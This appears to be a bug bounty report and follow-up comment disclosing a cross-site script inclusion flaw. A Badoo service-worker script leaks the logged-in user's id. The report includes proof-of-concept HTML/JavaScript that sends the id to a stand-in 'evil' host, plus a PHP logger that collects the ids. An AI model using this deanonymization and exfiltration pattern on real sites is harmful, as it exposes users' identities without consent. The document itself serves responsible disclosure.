This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .\n2. This information can identify the currently logged in user.\n3. The same script being public , and can be called and fetched by any rogue script on any website  .\n\n\n###What makes it an issue ?\n\nIt's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .\n\nAdditionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .\n\n###How can any one exploit the issue maliciously ? \n\nLet's consider the following as an exploit scenario .\n\nI'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .\n\nSo , I designed a plan as following :\n\n1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .\n2. The new product page should contain the Exploit code written below .\n\n```\n\u003chtml\u003e\n\u003cscript src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cscript\u003e\nfunction UnmaskUser(str) {\nreturn str.split('=')[0];\n}\nwindow.onload = function(){\nvar user = UnmaskUser(user_id);\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);\nxhr.send();\n};\n\u003c/script\u003e\n\u003c/html\u003e\n```\nAnd the `identity-stealer.php` should have the code :\n```\n\u003c?php\n$user = $_GET['victim'];\n$fd = fopen(\"badoo-users-interested-in-my-product.txt\",\"a\");\n fwrite($fd, $user);\n fclose($fd);\n?\u003e\n```\n\n3. The people who may be interested in my new product will start to visit my new product page .\n4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .\n5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .\n\n\n##Note : \nThis should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .\n\n\nBest regards , \nThanks ,\n\nSaeed H.

@uyga \n\nI'm very glad to clarify this for the team .\n\nOn Facebook or on Badoo profiles , the user disclosed user id is in the html source code and there's no way that can allow any script on a foreign domain to call the html response body , otherwise it would a significant [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) and [SOP](https://en.wikipedia.org/wiki/Same-origin_policy) violations . \n\nLet's recall what I've mentioned in the report :\n\n\u003eWhat made the vulnerability appear ?\n(1)This script https://badoo.com/worker-scope/chrome-service-worker.js?ws=1 being contained information dependent on the currently logged in user .\n(2)This information can identify the currently logged in user.\n(3)The same script being public , and can be called and fetched by any rogue script on any website .\n\n\nLet's compare between the the two files `view-source:https://www.facebook.com/` and `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` to see which of them applies to the mention terms :\n\n`view-source:https://www.facebook.com/` applies to point `1` and `2` but doesn't apply to point three , because the html body of the facebook page can't be called by any scripts hosted outside facebook.com because it's text/html file , that due to the protection of the Cross-Origin Resource Sharing (CORS) mechanism .\n\nOn the other hand ,\n`https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` applies to point `1` , `2` and `3` , so the difference here is the ability to call the file and fetch its content by an outsider rogue script .\n\n\nI hope this was clear enough to differentiate between calling and fetching a remote html page and a remote js file , please let me know if it wasn't .\n\nSome references on CORS and SOP
